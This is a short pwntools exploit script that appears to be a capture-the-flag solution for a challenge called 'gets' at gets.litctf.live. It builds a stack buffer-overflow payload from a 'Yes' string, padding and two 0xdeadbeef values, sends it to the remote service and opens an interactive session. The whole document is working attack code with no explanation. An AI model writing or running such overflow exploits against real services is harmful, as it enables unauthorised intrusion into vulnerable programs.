from pwn import *
elf = ELF('gets', checksec=False)
context.binary = elf

s = remote('gets.litctf.live', 1337)

payload = b"Yes\0" + b'a' * (0x20 - len("Yes\0"))
payload += p64(0xdeadbeef)
payload += p64(0xdeadbeef)

s.sendline(payload)
s.interactive()
